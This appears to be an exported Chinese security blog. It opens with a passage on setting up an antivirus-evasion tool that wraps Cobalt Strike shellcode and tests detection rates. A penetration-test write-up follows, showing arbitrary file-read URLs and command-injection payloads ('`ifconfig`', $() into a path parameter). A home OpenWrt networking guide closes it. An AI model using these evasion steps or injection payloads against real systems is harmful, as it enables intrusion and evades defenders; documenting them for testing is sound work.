<p><img data-src="/2021/07/02/%E8%AE%B0%E5%85%8D%E6%9D%80%E5%B7%A5%E5%85%B7BypassAv-web%E7%9A%84%E5%AE%89%E8%A3%85%E8%BF%87%E7%A8%8B/image-20210702113844897.png"></p>
<p>Google一下，原来是依赖库，根据官方说明安装一下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nimble install winim</span><br></pre></td></tr></table></figure>

<p>然后估计是网络不行还是什么问题，实际上会一直卡着，手动安装吧</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt install wget</span><br><span class="line">wget https:&#x2F;&#x2F;codeload.github.com&#x2F;khchen&#x2F;winim&#x2F;zip&#x2F;refs&#x2F;heads&#x2F;master</span><br><span class="line">apt install unzip</span><br><span class="line">unzip master</span><br><span class="line">cd winim-master&#x2F;</span><br><span class="line">nimble install</span><br></pre></td></tr></table></figure>

<p><img data-src="/2021/07/02/%E8%AE%B0%E5%85%8D%E6%9D%80%E5%B7%A5%E5%85%B7BypassAv-web%E7%9A%84%E5%AE%89%E8%A3%85%E8%BF%87%E7%A8%8B/image-20210702114554231.png"></p>
<p>这个时候再试试它的编译，能成功了</p>
<p><img data-src="/2021/07/02/%E8%AE%B0%E5%85%8D%E6%9D%80%E5%B7%A5%E5%85%B7BypassAv-web%E7%9A%84%E5%AE%89%E8%A3%85%E8%BF%87%E7%A8%8B/image-20210702114714722.png"></p>
<h3 id="最终效果"><a href="#最终效果" class="headerlink" title="最终效果"></a>最终效果</h3><p>安装成功后，使用CS生成shellcode</p>
<p><img data-src="/2021/07/02/%E8%AE%B0%E5%85%8D%E6%9D%80%E5%B7%A5%E5%85%B7BypassAv-web%E7%9A%84%E5%AE%89%E8%A3%85%E8%BF%87%E7%A8%8B/image-20210702144819125.png"></p>
<p>这里根据作者的说明是生成64位的RAW类型的shellcode</p>
<p><img data-src="/2021/07/02/%E8%AE%B0%E5%85%8D%E6%9D%80%E5%B7%A5%E5%85%B7BypassAv-web%E7%9A%84%E5%AE%89%E8%A3%85%E8%BF%87%E7%A8%8B/image-20210702160620690.png"></p>
<p>上线成功</p>
<p><img data-src="/2021/07/02/%E8%AE%B0%E5%85%8D%E6%9D%80%E5%B7%A5%E5%85%B7BypassAv-web%E7%9A%84%E5%AE%89%E8%A3%85%E8%BF%87%E7%A8%8B/image-20210702160905962.png"></p>
<p>本文编写于2021年7月2日，测试virustotal效果如下</p>
<p><img data-src="/2021/07/02/%E8%AE%B0%E5%85%8D%E6%9D%80%E5%B7%A5%E5%85%B7BypassAv-web%E7%9A%84%E5%AE%89%E8%A3%85%E8%BF%87%E7%A8%8B/image-20210702144316892.png"></p>
<p>测试微步效果如下</p>
<p><img data-src="/2021/07/02/%E8%AE%B0%E5%85%8D%E6%9D%80%E5%B7%A5%E5%85%B7BypassAv-web%E7%9A%84%E5%AE%89%E8%A3%85%E8%BF%87%E7%A8%8B/image-20210702144359468.png"></p>
<h3 id="进阶：重新编译testnim"><a href="#进阶：重新编译testnim" class="headerlink" title="进阶：重新编译testnim"></a>进阶：重新编译testnim</h3><p>阅读了源码，作者使用了testnim对shellcode进行了异或加密，作者提供了testnim的二进制文件它的源码testnim.nim，那么便尝试一下从源码编译testnim</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd code&#x2F;</span><br><span class="line">nim c -o&#x3D;testnim testnim.nim</span><br></pre></td></tr></table></figure>

<p><img data-src="/2021/07/02/%E8%AE%B0%E5%85%8D%E6%9D%80%E5%B7%A5%E5%85%B7BypassAv-web%E7%9A%84%E5%AE%89%E8%A3%85%E8%BF%87%E7%A8%8B/image-20210702162101828.png"></p>
<p>编译成功且测试运行成功</p>
<p><img data-src="/2021/07/02/%E8%AE%B0%E5%85%8D%E6%9D%80%E5%B7%A5%E5%85%B7BypassAv-web%E7%9A%84%E5%AE%89%E8%A3%85%E8%BF%87%E7%A8%8B/image-20210702162128439.png"></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>记一次远程命令执行漏洞的挖掘过程</title>
    <url>/2019/07/15/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B/</url>
    <content><![CDATA[<p><strong>本文仅作为技术讨论及分享，严禁用于任何非法用途。</strong><br>本文已在Freebuf发布，但文章经Freebuf编辑改动导致有小部分错误，故在这里改正并重新发布。<br><em>原文链接： <a href="https://www.freebuf.com/vuls/185380.html">https://www.freebuf.com/vuls/185380.html</a></em></p>
<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>最近为甲方做渗透测试发现了一个远程命令执行漏洞，可以通过构造恶意参数传递执行bash命令，本文回顾一下漏洞的挖掘过程。</p>
<a id="more"></a>
<h3 id="发现"><a href="#发现" class="headerlink" title="发现"></a>发现</h3><ol>
<li>通过<code>nessus</code>扫描器的<code>Sitemap</code>模块，发现了可疑目录：<br><img data-src="/2019/07/15/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B/2020-08-20-16-26-26.png"></li>
<li>根据<code>sitemap</code>的目录信息，打开URL:<code>http://x.x.x.x:28076/file/</code>，发现存在未授权访问漏洞：<br><img data-src="/2019/07/15/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B/2020-08-20-16-26-57.png"></li>
<li>逐个查看里面的文件，找到了一些比较有意思的JSP：<br><img data-src="/2019/07/15/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B/2020-08-20-16-27-22.png"></li>
<li>蒙了一下<code>dirFiles.jsp</code>的参数，发现使用<code>path</code>作为参数名可列出目录、文件信息，URL：<code>http://x.x.x.x:28076/file/dirFiles.jsp?path=.</code><br><img data-src="/2019/07/15/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B/2020-08-20-16-28-24.png"></li>
<li>同样的方法，发现<code>show.jsp</code>存在任意文件读取漏洞，URL：<code>http://x.x.x.x:28076/file/show.jsp?path=/etc/passwd</code><br><img data-src="/2019/07/15/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B/2020-08-20-16-29-00.png"></li>
<li>结合上面的目录信息和任意文件读取漏洞，对JSP文件简单审计一下，发现<code>logContentNewest.jsp</code>会调用一个<code>bash</code>脚本，便猜想能否使用它构造命令执行：<br><img data-src="/2019/07/15/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B/2020-08-20-16-29-32.png"></li>
</ol>
<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><ol>
<li><code>logContentNewest.jsp</code>正常执行是这样的，可自定义<code>path</code>参数的值，如<code>/etc/passwd</code>，来查找这个文件里面的内容：<br><img data-src="/2019/07/15/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B/2020-08-20-16-30-15.png"></li>
<li>分析<code>logContentNewest.jsp</code>和被调用的sh脚本，得知<code>path</code>参数最终会传入sh脚本的<code>FILE_PATH</code>变量，然后调用下面的判断逻辑。从下面代码我们可以看到，函数的功能是判断<code>FILE_PATH</code>变量的值是否存在，而这个变量的值目前是可控的<br><img data-src="/2019/07/15/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B/2020-08-20-16-31-00.png"></li>
<li>最初想通过添加双引号闭合if条件判断参数注入命令，没有成功<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload： &#x2F;etc&#x2F;passwd&quot; ];ls;then echo 1;fi;if [ -e &quot;123.txt;</span><br></pre></td></tr></table></figure>
<img data-src="/2019/07/15/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B/2020-08-20-16-31-44.png"></li>
<li>从上图可以看到，payload的双引号不见了，在自己的Linux测试一下，发现bash在这种情况下会过滤双引号，因此排除了存在过滤双引号的可能<br><img data-src="/2019/07/15/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B/2020-08-20-16-32-11.png"></li>
<li>经过多次测试，最终可用反引号<code>`</code>或者<code>$()</code>进行命令执行，如<code>ifconfig</code><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload：&quot;&#96;ifconfig&#96;&quot;</span><br></pre></td></tr></table></figure></li>
<li>命令结果的回显是因为判断不存在<code>FILA_PATH</code>文件名的文件后，会把变量值返回，其源码如下:<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &quot;the file($FILE_PATH) dose not exist!&quot;</span><br></pre></td></tr></table></figure>
<strong>拓展知识：</strong> Linux bash中可以使用反引号<code>`</code>或者<code>$()</code>等方式将bash命令的执行结果保存到变量中，如<code>FILE_PATH=$(ifconfig)</code></li>
<li>命令执行结果显示不完整，只能看到返回的第一行的结果，没关系，可以简单优化一下:<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload：&quot;&#96;ifconfig |xargs&#96;&quot;</span><br></pre></td></tr></table></figure>
<strong>拓展知识：</strong> <code>xargs</code>可以将stdin中以空格或换行符进行分隔的数据，形成以空格分隔的参数（arguments），传递给其他命令。因为以空格作为分隔符，所以有一些文件名或者其他意义的名词内含有空格的时候，<code>xargs</code>可能会误判。简单来说，<code>xargs</code>是给其他命令传递参数的一个过滤器，是构建单行命令的重要组件之一。 但是这里仅仅只是通过<code>xargs</code>的特性让它把多行内容转换成一行来更好地显示结果，当然也可以使用其他方法来实现。<br><img data-src="/2019/07/15/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B/2020-08-20-16-36-28.png"></li>
<li>再看看nmap内网扫描的结果，同样的漏洞组件在内网中还发现了很多…<br><img data-src="/2019/07/15/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B/2020-08-20-16-37-07.png"></li>
</ol>
<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>漏洞是由于程序调用bash脚本传参时没有做过滤，通过$(cmd)这样的方式来执行命令并将结果存入变量中，在脚本判断文件不存在时会返回文件名，造成了回显。</p>
<h3 id="漏洞修复方法"><a href="#漏洞修复方法" class="headerlink" title="漏洞修复方法"></a>漏洞修复方法</h3><p>严格控制文件名参数值，先判断文件名或文件路径是否合法可修复漏洞。</p>
]]></content>
      <categories>
        <category>漏洞挖掘</category>
      </categories>
      <tags>
        <tag>漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>记家庭网络组网</title>
    <url>/2023/01/25/%E8%AE%B0%E5%AE%B6%E5%BA%AD%E7%BD%91%E7%BB%9C%E7%BB%84%E7%BD%91/</url>
    <content><![CDATA[<p><strong>本文仅作为技术讨论及分享，严禁用于任何非法用途。</strong></p>
<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>本文是博主一次家庭网络从零到一组网的过程，其中涉及到的很多坑在搜索引擎上并未找到解决方法，所以在此记录一下，以帮助有缘人。</p>
<p>本文涉及：</p>
<ul>
<li>openwrt固件编译</li>
<li>光猫桥接</li>
<li>openwrt iptv单线复用</li>
<li>WiFi漫游</li>
<li>wireguard ipv6 异地组网</li>
<li>frp、nps</li>
<li>阿里云webdav</li>
</ul>
<a id="more"></a>
<h3 id="网络结构介绍"><a href="#网络结构介绍" class="headerlink" title="网络结构介绍"></a>网络结构介绍</h3><p>博主的户型及物理网络结构如下：<br><img data-src="/2023/01/25/%E8%AE%B0%E5%AE%B6%E5%BA%AD%E7%BD%91%E7%BB%9C%E7%BB%84%E7%BD%91/2023-01-25-22-41-50.png"></p>
<p>物理线路：<br><img data-src="/2023/01/25/%E8%AE%B0%E5%AE%B6%E5%BA%AD%E7%BD%91%E7%BB%9C%E7%BB%84%E7%BD%91/2023-01-25-22-45-22.png"></p>
<h3 id="需求说明"><a href="#需求说明" class="headerlink" title="需求说明"></a>需求说明</h3><p>由于网线在是开发商预埋好的，网络布线其实是不太合理的，但是没办法变更了。</p>
<p>最大的难点是，弱电箱到客厅电视只有一条网线，如果用来给iptv，则没办法装在客厅放路由器，只能放在弱电箱，就很难受了，所以需要进行iptv线路的单线复用。</p>
<p>因为不常住，所以并没有放置x86服务器做软路由的想法，按照最小预算的想法，选择了mt7621的瑞斯康达MSG1500 X.00刷入openwrt担当主路由，小黄鱼仅需49元包邮。</p>
<p>配置如下：</p>
<ul>
<li>CPU：MT7621</li>
<li>接口：1WAN+4LAN,USB2.0(全千兆网口)</li>
<li>无线：2.4G/5G(7615DN)</li>
<li>Flash：128M(NAND)</li>
<li>内存：256M</li>
</ul>
<p>无线网络的话，中国移动宽带送了一个WiFi 6路由器，将就着废物利用，充当AP，放置在房间1。在客厅放置一个AX 3000无线路由器设置AP模式充当AP。</p>
<p>然后是异地组网，在工作地宿舍也有一个小型网络，需要打通网络进行互访，以方便内网访问群晖、摄像头等资源，而移动没有ipv4的公网ip，所以通过ipv6组网。</p>
<p>最终组网效果如下，192.168.100.0/24网段是本次家庭网络的网段。<br><img data-src="/2023/01/25/%E8%AE%B0%E5%AE%B6%E5%BA%AD%E7%BD%91%E7%BB%9C%E7%BB%84%E7%BD%91/2023-02-07-15-05-23.png"></p>
<h3 id="openwrt固件编译"><a href="#openwrt固件编译" class="headerlink" title="openwrt固件编译"></a>openwrt固件编译</h3><p>因为博主的各种需求，而且也不想用别人的固件，所以选择了自行定制openwrt编译固件。<br><img data-src="/2023/01/25/%E8%AE%B0%E5%AE%B6%E5%BA%AD%E7%BD%91%E7%BB%9C%E7%BB%84%E7%BD%91/2023-01-25-23-35-17.png"></p>
<p>主要是加入了aliyundrive-webdav、omcproxy、wireguard、ipv6helper、frp、nps、mwan3等拓展，具体的配置文件如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;ryanInf&#x2F;OpenWrt-MSG1500-Actions&#x2F;blob&#x2F;main&#x2F;.config</span><br></pre></td></tr></table></figure>

<p>编译方法参考：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;p3terx.com&#x2F;archives&#x2F;build-openwrt-with-github-actions.html</span><br></pre></td></tr></table></figure>

<p>通过Github Actions编译好固件：<br><img data-src="/2023/01/25/%E8%AE%B0%E5%AE%B6%E5%BA%AD%E7%BD%91%E7%BB%9C%E7%BB%84%E7%BD%91/2023-01-25-23-55-08.png"></p>
<h3 id="MSG1500刷入固件"><a href="#MSG1500刷入固件" class="headerlink" title="MSG1500刷入固件"></a>MSG1500刷入固件</h3><p>请注意，MSG1500路由器有两个版本，一个白色，一个黑色，请购买黑色的X.00版本，白色为阉割版，下面简述输入固件过程。</p>
<p>官方的固件，是直接telnet可以连上，配置好路由器ip后，通过telnet连接，账号：root/root<br><img data-src="/2023/01/25/%E8%AE%B0%E5%AE%B6%E5%BA%AD%E7%BD%91%E7%BB%9C%E7%BB%84%E7%BD%91/2023-01-25-23-57-11.png"></p>
<p>然后备份路由器分区：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dd <span class="keyword">if</span>=/dev/mtd4 of=/tmp/firmware_backup.bin</span><br><span class="line">dd <span class="keyword">if</span>=/dev/mtd1 of=/tmp/Bootloader_backup.bin</span><br></pre></td></tr></table></figure>
<p><img data-src="/2023/01/25/%E8%AE%B0%E5%AE%B6%E5%BA%AD%E7%BD%91%E7%BB%9C%E7%BB%84%E7%BD%91/2023-01-25-23-58-34.png"></p>
<p>下载tftpd32.exe，搭建tftp服务，或者用群晖的tftp服务，通过tftp把备份文件取出：<br><img data-src="/2023/01/25/%E8%AE%B0%E5%AE%B6%E5%BA%AD%E7%BD%91%E7%BB%9C%E7%BB%84%E7%BD%91/2023-01-25-23-59-04.png"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 这里 192.168.1.100 是tftp服务器地址</span></span><br><span class="line"><span class="built_in">cd</span> /tmp/</span><br><span class="line">tftp -pl Bootloader_backup.bin 192.168.1.100</span><br><span class="line">tftp -pl firmware_backup.bin  192.168.1.100</span><br></pre></td></tr></table></figure>

<p>下载 breed breed-mt7621-hiwifi-hc5962.bin<br><a href="https://breed.hackpascal.net/">https://breed.hackpascal.net/</a></p>
<p>下载后把breed-mt7621-hiwifi-hc5962.bin放入tftpd目录，再通过tftp下载到msg1500上面：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tftp -gr breed-mt7621-hiwifi-hc5962.bin 192.168.1.100</span><br></pre></td></tr></table></figure>

<p>刷入Breed：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mtd write /tmp/breed-mt7621-hiwifi-hc5962.bin Bootloader</span><br></pre></td></tr></table></figure>
<p><img data-src="/2023/01/25/%E8%AE%B0%E5%AE%B6%E5%BA%AD%E7%BD%91%E7%BB%9C%E7%BB%84%E7%BD%91/2023-01-26-00-04-02.png"></p>
<p>路由器断电，然后按住路由WPS键并通电(WPS键继续按住8秒左右)，在浏览器输入192.168.1.1访问Breed后台进行固件刷入：<br><img data-src="/2023/01/25/%E8%AE%B0%E5%AE%B6%E5%BA%AD%E7%BD%91%E7%BB%9C%E7%BB%84%E7%BD%91/2023-01-26-00-04-38.png"></p>
<p>刷入第一步编译出来的固件：openwrt-ramips-mt7621-raisecom_msg1500-x-00-initramfs-kernel.bin</p>
<p>静待路由器重启，然后刷新浏览器可看到openwrt登陆页面，账号：root/password，此时刷机已完成。</p>
<h3 id="光猫桥接配置"><a href="#光猫桥接配置" class="headerlink" title="光猫桥接配置"></a>光猫桥接配置</h3><p>光猫改桥接后有利于P2P下载、内网穿透、减少NAT层级性能更优，也方便自定义网络，所以需要进行光猫改桥接，改之前请确保你知道自己的宽带账号及密码。</p>
<p>博主是广东移动的宽带，配置仅供参考。</p>
<p>首先获取光猫的超管密码，搜一下就有，用户名是<code>CMCCAdmin</code>，如果找不到就咨询宽带客服。<br>首先我们得区分哪个是上网连接，哪个是IPTV，博主这里是41和48连接：<br><img data-src="/2023/01/25/%E8%AE%B0%E5%AE%B6%E5%BA%AD%E7%BD%91%E7%BB%9C%E7%BB%84%E7%BD%91/2023-01-26-00-15-21.png"></p>
<p>通过LAN1口绑定的信息，可以知道vlan41连接是上网连接，vlan48是iptv：<br><img data-src="/2023/01/25/%E8%AE%B0%E5%AE%B6%E5%BA%AD%E7%BD%91%E7%BB%9C%E7%BB%84%E7%BD%91/2023-01-26-00-17-09.png"><br><img data-src="/2023/01/25/%E8%AE%B0%E5%AE%B6%E5%BA%AD%E7%BD%91%E7%BB%9C%E7%BB%84%E7%BD%91/2023-01-26-00-18-32.png"></p>
<p>然后可以开始改桥接了，在修改之前，最好是对以上页面截图保存，以防配置失败改不回来。<br>首先进行用户侧vlan的绑定，我们知道，运营商网络通过vlan来区分上网和iptv等流量，我们知道上网是vlan41，iptv是vlan48，这里的vlan900是组播vlan，为了让openwrt能够区分这两组流量，所以需要给他们打上vlan标签。当然了，你把光猫插上两条网线到openwrt也能做这个区分，但这就白白浪费一根网线了，也不优雅。<br><img data-src="/2023/01/25/%E8%AE%B0%E5%AE%B6%E5%BA%AD%E7%BD%91%E7%BB%9C%E7%BB%84%E7%BD%91/2023-01-26-00-21-00.png"></p>
<p>很简单，只需要把原来的路由模式，改成桥接模式：<br><img data-src="/2023/01/25/%E8%AE%B0%E5%AE%B6%E5%BA%AD%E7%BD%91%E7%BB%9C%E7%BB%84%E7%BD%91/2023-01-26-00-26-31.png"><br><img data-src="/2023/01/25/%E8%AE%B0%E5%AE%B6%E5%BA%AD%E7%BD%91%E7%BB%9C%E7%BB%84%E7%BD%91/2023-01-26-00-26-07.png"></p>
<p>然后登陆路由器对wan口进行pppoe拨号配置：<br><img data-src="/2023/01/25/%E8%AE%B0%E5%AE%B6%E5%BA%AD%E7%BD%91%E7%BB%9C%E7%BB%84%E7%BD%91/2023-01-26-00-29-06.png"><br>注意MTU要设置的比光猫那小，LCP 响应故障阈值设置为0，防止误判定为掉线。博主在这里踩坑了，刚开始MTU默认为1500导致经常性掉线，需要手动重新拨号才能上网：<br><img data-src="/2023/01/25/%E8%AE%B0%E5%AE%B6%E5%BA%AD%E7%BD%91%E7%BB%9C%E7%BB%84%E7%BD%91/2023-01-26-00-30-12.png"><br>物理接口需要绑定vlan41，即在原来接口名称后加上<code>.41</code>：<br><img data-src="/2023/01/25/%E8%AE%B0%E5%AE%B6%E5%BA%AD%E7%BD%91%E7%BB%9C%E7%BB%84%E7%BD%91/2023-01-26-00-32-12.png"><br>防火墙区域按默认的WAN即可：<br><img data-src="/2023/01/25/%E8%AE%B0%E5%AE%B6%E5%BA%AD%E7%BD%91%E7%BB%9C%E7%BB%84%E7%BD%91/2023-01-26-00-33-15.png"><br>保存后返回接口页面，应该可以看到成功拨号并获取到ip地址：<br><img data-src="/2023/01/25/%E8%AE%B0%E5%AE%B6%E5%BA%AD%E7%BD%91%E7%BB%9C%E7%BB%84%E7%BD%91/2023-01-26-00-34-16.png"></p>
<p>接下来配置LAN，设置自己的LAN网段：<br><img data-src="/2023/01/25/%E8%AE%B0%E5%AE%B6%E5%BA%AD%E7%BD%91%E7%BB%9C%E7%BB%84%E7%BD%91/2023-02-07-11-27-43.png"><br><img data-src="/2023/01/25/%E8%AE%B0%E5%AE%B6%E5%BA%AD%E7%BD%91%E7%BB%9C%E7%BB%84%E7%BD%91/2023-02-07-11-28-40.png"><br><img data-src="/2023/01/25/%E8%AE%B0%E5%AE%B6%E5%BA%AD%E7%BD%91%E7%BB%9C%E7%BB%84%E7%BD%91/2023-02-07-11-29-00.png"><br><img data-src="/2023/01/25/%E8%AE%B0%E5%AE%B6%E5%BA%AD%E7%BD%91%E7%BB%9C%E7%BB%84%E7%BD%91/2023-02-07-11-29-32.png"></p>
<p>强制DHCP建议勾选上，移动送的路由器即便设置成AP默认仍然会启动DHCP导致内网设备不能上网，勾选后就不会有这个问题：<br><img data-src="/2023/01/25/%E8%AE%B0%E5%AE%B6%E5%BA%AD%E7%BD%91%E7%BB%9C%E7%BB%84%E7%BD%91/2023-02-07-11-29-53.png"></p>
<p><img data-src="/2023/01/25/%E8%AE%B0%E5%AE%B6%E5%BA%AD%E7%BD%91%E7%BB%9C%E7%BB%84%E7%BD%91/2023-02-07-11-31-29.png"></p>
<p><strong>配置完成后，通过WiFi连接或者LAN口连接可访问公网。</strong></p>
<h3 id="IPTV单线复用"><a href="#IPTV单线复用" class="headerlink" title="IPTV单线复用"></a>IPTV单线复用</h3><p><strong>iptv单线复用，是指iptv网络流量与本地内网流量共用一条线路。很多时候我们客厅可能只有一根网线，需要给iptv机顶盒使用，如果需要WIFI覆盖就只能把无线路由放到弱电箱或者其它房间，导致无线网络质量变差，通过iptv单线复用使我们可以同时在客厅使用iptv机顶盒与无线路由器。</strong></p>
<p>要配置单线复用，首先要理解单线复用原理。其实很简单，就是把iptv机顶盒的流量指定走光猫的iptv线路（不用地域与运营商可能有额外校验方式，只需增加一些配置，基本原理不变），理解这个原理实现起来就很简单了，概括起来大致有以下方法实现：</p>
<ul>
<li>vlan (需购买至少1个支持vlan的交换机或同等设备，配置复杂，成本高，适合有定制需求的高玩)</li>
<li>爱快分流 （需购买爱快路由器或者x86虚拟机安装，配置简单，优雅）</li>
<li>openwrt mwan3分流 （openwrt支持的设备比较多，方便，但配置起来不优雅）</li>
<li>支持iptv的无线路由器 （适合使用无线路由器充当主路由的，如有其它设备做主路由的如软路由，则配置起来复杂点）</li>
<li>把8芯网线拆成4+4 （最高速率只能百兆，得不偿失，极度不推荐）</li>
</ul>
<p>这里选择<code>openwrt mwan3分流</code>的方法，因为暂时还没有24小时运行的pc机放家里。</p>
<p>在openwrt上新建一个<code>wan_iptv</code>接口，接口类型是<code>wan</code>，同时绑定光猫上配置的<code>vlan</code>号：<br><img data-src="/2023/01/25/%E8%AE%B0%E5%AE%B6%E5%BA%AD%E7%BD%91%E7%BB%9C%E7%BB%84%E7%BD%91/2023-02-07-12-57-43.png"><br>协议是dhcp，主机名的话可默认，如果不行可尝试修改为机顶盒的主机名，通过openwrt的dhcp设置页可看到主机名：<br><img data-src="/2023/01/25/%E8%AE%B0%E5%AE%B6%E5%BA%AD%E7%BD%91%E7%BB%9C%E7%BB%84%E7%BD%91/2023-02-07-12-59-27.png"><br>网关跃点需要设置为比默认网关（即wan口）的大，习惯设置为100，这样内网设备默认不会走此线路：<br><img data-src="/2023/01/25/%E8%AE%B0%E5%AE%B6%E5%BA%AD%E7%BD%91%E7%BB%9C%E7%BB%84%E7%BD%91/2023-02-07-13-01-21.png"><br>防火墙区域是<code>wan</code>，这样内网设备使用此网关的话会经过nat：<br><img data-src="/2023/01/25/%E8%AE%B0%E5%AE%B6%E5%BA%AD%E7%BD%91%E7%BB%9C%E7%BB%84%E7%BD%91/2023-02-07-13-03-16.png"></p>
<p>保存配置后，可看到<code>wan_iptv</code>接口成功获取到<code>10段</code>的iptv线路地址，注意如果获取到的是<code>100段</code>或者其它段的地址是不行的，需要检查下<code>MAC地址</code>、<code>主机名</code>等配置是否有冲突，正常情况下移动的是按默认可获取到正确的ip：<br><img data-src="/2023/01/25/%E8%AE%B0%E5%AE%B6%E5%BA%AD%E7%BD%91%E7%BB%9C%E7%BB%84%E7%BD%91/2023-02-07-13-07-26.png"></p>
<p>现在iptv线路没问题了，难点就在于让iptv机顶盒的流量走<code>wan_iptv</code>接口，需要用到<code>mwan3</code>，可尝试通过opkg安装或自行编译或找别人编译好的，在第一步的估计编译中博主已集成该模块。</p>
<p>找到<code>负载均衡</code>，然后新建一个接口<code>wan_iptv</code>：<br><img data-src="/2023/01/25/%E8%AE%B0%E5%AE%B6%E5%BA%AD%E7%BD%91%E7%BB%9C%E7%BB%84%E7%BD%91/2023-02-07-13-14-11.png"><br><img data-src="/2023/01/25/%E8%AE%B0%E5%AE%B6%E5%BA%AD%E7%BD%91%E7%BB%9C%E7%BB%84%E7%BD%91/2023-02-07-13-15-39.png"></p>
<p>创建成员<code>iptv_member</code>，此处最好把该成员规则置顶：<br><img data-src="/2023/01/25/%E8%AE%B0%E5%AE%B6%E5%BA%AD%E7%BD%91%E7%BB%9C%E7%BB%84%E7%BD%91/2023-02-07-13-16-23.png"><br><img data-src="/2023/01/25/%E8%AE%B0%E5%AE%B6%E5%BA%AD%E7%BD%91%E7%BB%9C%E7%BB%84%E7%BD%91/2023-02-07-13-16-57.png"></p>
<p>创建策略<code>iptv</code>：<br><img data-src="/2023/01/25/%E8%AE%B0%E5%AE%B6%E5%BA%AD%E7%BD%91%E7%BB%9C%E7%BB%84%E7%BD%91/2023-02-07-13-17-40.png"><br><img data-src="/2023/01/25/%E8%AE%B0%E5%AE%B6%E5%BA%AD%E7%BD%91%E7%BB%9C%E7%BB%84%E7%BD%91/2023-02-07-13-18-06.png"></p>
<p>创建规则<code>iptv_rule</code>，源地址写iptv机顶盒的ip，策略选择<code>iptv</code>：<br><img data-src="/2023/01/25/%E8%AE%B0%E5%AE%B6%E5%BA%AD%E7%BD%91%E7%BB%9C%E7%BB%84%E7%BD%91/2023-02-07-13-18-27.png"><br><img data-src="/2023/01/25/%E8%AE%B0%E5%AE%B6%E5%BA%AD%E7%BD%91%E7%BB%9C%E7%BB%84%E7%BD%91/2023-02-07-13-19-42.png"></p>
